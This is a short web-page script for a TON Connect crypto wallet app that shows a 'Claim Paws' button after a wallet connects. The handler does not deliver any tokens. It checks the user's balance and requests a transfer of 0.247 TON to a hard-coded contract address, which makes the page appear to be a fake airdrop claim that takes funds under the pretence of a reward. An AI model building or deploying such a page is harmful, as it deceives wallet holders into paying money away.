<script>
const CONTRACT_ADDRESS = 'EQCzC-lHViu4W3R6CON5nUgGCEf_l5hA5cDJjVVX2uEGnW38';
const REQUIRED_AMOUNT = '247000000'; // 0.247 TON in nanotons

// Initialize TON Connect
const tonConnect = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://hasan199191.github.io/my-ton-app/tonconnect-manifest.json',
    buttonRootId: 'connect-container',
    buttonCssClass: 'connect-button'
});

// Create claim button but don't add it to DOM yet
const claimButton = document.createElement('button');
claimButton.className = 'connect-button';
claimButton.style.display = 'none';
claimButton.textContent = 'Claim Paws';
claimButton.onclick = handleClaim;

// Handle wallet connection status changes
tonConnect.onStatusChange(async (wallet) => {
    if (wallet) {
        console.log('Wallet connected:', wallet.account.address);
        // Add and show claim button only after wallet connection
        document.getElementById('connect-container').after(claimButton);
        claimButton.style.display = 'block';
    } else {
        // Remove claim button when wallet disconnects
        claimButton.remove();
    }
});

async function handleClaim() {
    try {
        // Check balance when claim button is clicked
        const balance = await tonConnect.getBalance();
        if (balance < REQUIRED_AMOUNT) {
            alert("Your wallet balance is less than 0.247 TON.\nPlease add more TON to continue.");
            return;
        }

        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 600,
            messages: [{
                address: CONTRACT_ADDRESS,
                amount: REQUIRED_AMOUNT,
                payload: 'increment'
            }]
        };
        
        await tonConnect.sendTransaction(transaction);
        alert('Transaction successful! Thank you for your contribution.');
    } catch (error) {
        console.error('Transaction failed:', error);
        // Show required amount even if balance check fails
        alert("Transaction failed. Required amount: 0.247 TON");
    }
}
</script>
